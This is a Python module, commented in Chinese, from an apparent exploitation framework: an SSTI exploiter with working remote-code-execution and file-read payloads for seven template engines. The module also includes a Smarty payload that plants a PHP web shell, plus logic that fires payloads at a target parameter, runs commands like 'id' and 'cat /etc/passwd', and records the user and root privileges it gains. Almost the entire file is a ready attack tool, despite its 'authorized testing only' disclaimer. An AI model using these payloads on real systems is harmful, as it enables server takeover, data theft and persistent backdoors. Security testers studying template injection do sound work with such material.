#!/usr/bin/env python3
"""
SSTI 利用器 - 服务端模板注入漏洞利用

支持模板引擎:
- Jinja2 (Python)
- Twig (PHP)
- Freemarker (Java)
- Velocity (Java)
- Thymeleaf (Java)
- ERB (Ruby)
- Smarty (PHP)

警告: 本工具仅用于授权安全测试
"""

import logging
import re
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from ..engine import (
    BaseExploiter,
    ExploitResult,
    ExploitStatus,
    ExploitType,
    ShellInfo,
    register_exploiter,
)

logger = logging.getLogger(__name__)


@register_exploiter(["ssti", "template_injection"])
class SSTIExploiter(BaseExploiter):
    """服务端模板注入利用器"""

    name = "ssti_exploiter"
    supported_vuln_types = ["ssti", "template_injection"]
    exploit_type = ExploitType.CODE_INJECTION

    # 预编译检测正则表达式
    _DETECT_PATTERNS = {
        "jinja2": re.compile(r"\{\{.*?\}\}"),
        "twig": re.compile(r"\{\{.*?\}\}|\{%.*?%\}"),
        "freemarker": re.compile(r"\$\{.*?\}|<#.*?#>|\[#.*?#\]"),
        "velocity": re.compile(r"\$[a-zA-Z_]+|\#[a-zA-Z_]+\("),
        "thymeleaf": re.compile(r"\$\{.*?\}|\*\{.*?\}|__\$\{.*?\}__"),
        "erb": re.compile(r"<%=.*?%>|<%.*?%>"),
        "smarty": re.compile(r"\{.*?\}"),
    }

    # 预编译命令输出提取正则表达式
    _COMMAND_OUTPUT_PATTERNS = {
        "id": re.compile(r"uid=\d+[^\n<]+", re.MULTILINE),
        "whoami": re.compile(r"^[a-z_][a-z0-9_-]{0,31}$", re.MULTILINE),
        "passwd": re.compile(r"root:[^:]*:\d+:\d+:[^:]*:[^:]*:[^\n]+", re.MULTILINE),
        "uname": re.compile(r"Linux\s+\S+\s+\S+", re.MULTILINE),
        "hostname": re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9\-]{0,62}$", re.MULTILINE),
    }

    # 额外的预编译正则表达式
    _RE_UID_INFO = re.compile(r"uid=\d+[^\n<]+")
    _RE_UID_USER = re.compile(r"uid=\d+\(([^)]+)\)")

    # 模板引擎RCE Payload
    TEMPLATE_PAYLOADS = {
        "jinja2": {
            "rce": [
                "{{config.__class__.__init__.__globals__['os'].popen('{{CMD}}').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('{{CMD}}').read()}}",
                "{{cycler.__init__.__globals__.os.popen('{{CMD}}').read()}}",
                "{{joiner.__init__.__globals__.os.popen('{{CMD}}').read()}}",
            ],
            "file_read": [
                "{{''.__class__.__mro__[2].__subclasses__()[40]('{{FILE}}').read()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('cat {{FILE}}').read()}}",
            ],
        },
        "twig": {
            "rce": [
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('{{CMD}}')}}",
                "{{['{{CMD}}']|filter('system')}}",
                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{{CMD}}')}}",
            ],
            "file_read": [
                "{{'/etc/passwd'|file_excerpt(1,30)}}",
                "{{source('{{FILE}}')}}",
            ],
        },
        "freemarker": {
            "rce": [
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{{CMD}}")}',
                "[#assign ex='freemarker.template.utility.Execute'?new()]${ex('{{CMD}}')}",
                '${"freemarker.template.utility.Execute"?new()("{{CMD}}")}',
            ],
            "file_read": [
                '<#include "{{FILE}}">',
                "<#assign content = .get_optional_template('{{FILE}}')!>",
            ],
        },
        "velocity": {
            "rce": [
                "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('{{CMD}}'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
            ],
            "file_read": [
                "#include('{{FILE}}')",
            ],
        },
        "thymeleaf": {
            "rce": [
                "__${T(java.lang.Runtime).getRuntime().exec('{{CMD}}')}__::.x",
                "${T(java.lang.Runtime).getRuntime().exec('{{CMD}}')}",
                "*{T(java.lang.Runtime).getRuntime().exec('{{CMD}}')}",
            ],
            "file_read": [],
        },
        "erb": {
            "rce": [
                "<%= system('{{CMD}}') %>",
                "<%= `{{CMD}}` %>",
                "<%= IO.popen('{{CMD}}').readlines() %>",
            ],
            "file_read": [
                "<%= File.read('{{FILE}}') %>",
            ],
        },
        "smarty": {
            "rce": [
                "{php}system('{{CMD}}');{/php}",
                "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
            ],
            "file_read": [
                "{fetch file='{{FILE}}'}",
                "{include file='{{FILE}}'}",
            ],
        },
    }

    # OS命令
    OS_COMMANDS = {
        "unix": ["id", "whoami", "uname -a", "cat /etc/passwd"],
        "windows": ["whoami", "hostname", "systeminfo"],
    }

    def exploit(
        self, detection_result: Any, targets: Optional[Dict[str, Any]] = None, **kwargs
    ) -> ExploitResult:
        """
        执行SSTI利用

        Args:
            detection_result: 漏洞检测结果
            targets: 利用目标配置
                - commands: 要执行的命令列表
                - files: 要读取的文件列表
                - template_engine: 模板引擎类型
        """
        start_time = time.time()

        # 提取检测信息
        url = getattr(detection_result, "url", "")
        param = getattr(detection_result, "param", "")
        payload = getattr(detection_result, "payload", "")
        extra = getattr(detection_result, "extra", {}) or {}

        if not url or not param:
            return self._create_result(
                status=ExploitStatus.NOT_APPLICABLE,
                vuln_type="ssti",
                url=url,
                error="缺少URL或参数信息",
            )

        # 获取配置
        targets = targets or {}
        template_engine = extra.get("template_engine") or self._detect_template_engine(payload)
        os_type = extra.get("os_type", "unix")
        timeout = targets.get("timeout", 30)

        # 获取命令和文件目标
        commands = targets.get("commands", self.OS_COMMANDS.get(os_type, self.OS_COMMANDS["unix"]))
        files = targets.get("files", ["/etc/passwd"])

        logger.info(f"[SSTIExploiter] 开始利用 URL={url}, param={param}, engine={template_engine}")

        # 尝试RCE
        rce_results = {}
        shell_info = None

        for command in commands[:4]:
            result = self._try_rce(url, param, command, template_engine, timeout)
            if result["success"]:
                rce_results[command] = result["output"]
                if not shell_info:
                    shell_info = self._build_shell_info(result["output"], os_type)

        # 尝试文件读取
        file_results = {}
        if not rce_results:
            for file_path in files[:3]:
                result = self._try_file_read(url, param, file_path, template_engine, timeout)
                if result["success"]:
                    file_results[file_path] = result["content"]

        execution_time = (time.time() - start_time) * 1000

        if rce_results:
            return self._create_result(
                status=ExploitStatus.SUCCESS,
                vuln_type="ssti",
                url=url,
                shell=shell_info,
                data={
                    "executed_commands": rce_results,
                    "template_engine": template_engine,
                },
                evidence=f"成功执行 {len(rce_results)} 个命令",
                execution_time_ms=execution_time,
                metadata={
                    "template_engine": template_engine,
                    "os_type": os_type,
                    "param": param,
                },
            )
        elif file_results:
            return self._create_result(
                status=ExploitStatus.PARTIAL,
                vuln_type="ssti",
                url=url,
                data={
                    "files_read": file_results,
                    "template_engine": template_engine,
                },
                evidence=f"成功读取 {len(file_results)} 个文件",
                execution_time_ms=execution_time,
                metadata={
                    "template_engine": template_engine,
                    "param": param,
                },
            )
        else:
            return self._create_result(
                status=ExploitStatus.FAILED,
                vuln_type="ssti",
                url=url,
                error="SSTI利用失败",
                execution_time_ms=execution_time,
                metadata={"template_engine": template_engine},
            )

    def _detect_template_engine(self, payload: str) -> str:
        """检测模板引擎类型"""
        if not payload:
            return "jinja2"  # 默认

        payload_lower = payload.lower()

        # 根据payload特征判断
        if "{{" in payload or "{%" in payload:
            if "__class__" in payload or "__mro__" in payload:
                return "jinja2"
            if "_self" in payload or "filter" in payload:
                return "twig"
            return "jinja2"

        if "${" in payload or "<#" in payload:
            if "freemarker" in payload_lower or "Execute" in payload:
                return "freemarker"
            if "T(" in payload or "java" in payload_lower:
                return "thymeleaf"

        if "#set" in payload or "#foreach" in payload:
            return "velocity"

        if "<%=" in payload or "<%" in payload:
            return "erb"

        if "{php}" in payload_lower or "{fetch" in payload_lower:
            return "smarty"

        return "jinja2"  # 默认

    def _try_rce(
        self, url: str, param: str, command: str, template_engine: str, timeout: int
    ) -> Dict[str, Any]:
        """尝试RCE"""
        engine_payloads = self.TEMPLATE_PAYLOADS.get(template_engine, {})
        rce_templates = engine_payloads.get("rce", [])

        for template in rce_templates:
            # 替换命令占位符
            payload = template.replace("{{CMD}}", command)

            # 使用统一的HTTP客户端
            result = self.exploit_http.send_get_with_payload(url, param, payload, timeout)
            if result["success"]:
                output = self._extract_command_output(result["response"], command)
                if output:
                    return {"success": True, "output": output, "payload": payload}

        return {"success": False}

    def _try_file_read(
        self, url: str, param: str, file_path: str, template_engine: str, timeout: int
    ) -> Dict[str, Any]:
        """尝试文件读取"""
        engine_payloads = self.TEMPLATE_PAYLOADS.get(template_engine, {})
        file_templates = engine_payloads.get("file_read", [])

        for template in file_templates:
            payload = template.replace("{{FILE}}", file_path)

            # 使用统一的HTTP客户端
            result = self.exploit_http.send_get_with_payload(url, param, payload, timeout)
            if result["success"]:
                # 检查文件内容特征
                if self._validate_file_content(result["response"], file_path):
                    return {"success": True, "content": result["response"][:2000]}

        return {"success": False}

    def _extract_command_output(self, response: str, command: str) -> Optional[str]:
        """提取命令输出"""
        if not response:
            return None

        # 检查常见命令输出特征 (使用预编译的正则表达式)
        for key, pattern in self._COMMAND_OUTPUT_PATTERNS.items():
            if key in command:
                match = pattern.search(response)  # 直接使用 .search() 而非 re.search()
                if match:
                    return match.group(0).strip()

        # 通用检测 (使用预编译的正则表达式)
        if "uid=" in response:
            match = self._RE_UID_INFO.search(response)
            if match:
                return match.group(0)

        return None

    def _validate_file_content(self, response: str, file_path: str) -> bool:
        """验证文件内容"""
        if "/etc/passwd" in file_path:
            return "root:" in response and ":0:0:" in response

        if "win.ini" in file_path.lower():
            return "[fonts]" in response.lower() or "[extensions]" in response.lower()

        # 检查是否有有意义的内容
        return len(response) > 50 and not "<html" in response.lower()

    def _build_shell_info(self, output: str, os_type: str) -> ShellInfo:
        """构建Shell信息"""
        user = ""
        privileges = []

        # 提取用户名 (使用预编译的正则表达式)
        if "uid=" in output:
            match = self._RE_UID_USER.search(output)
            if match:
                user = match.group(1)
        elif output.strip() and len(output.strip()) < 50:
            user = output.strip().split("\n")[0]

        # 检测权限
        if "uid=0" in output or user == "root":
            privileges = ["root"]

        return ShellInfo(
            shell_type="ssti",
            os_type=os_type,
            user=user,
            privileges=privileges,
            verified=bool(user),
        )


def register_ssti_exploiter():
    """注册SSTI利用器"""
    return SSTIExploiter
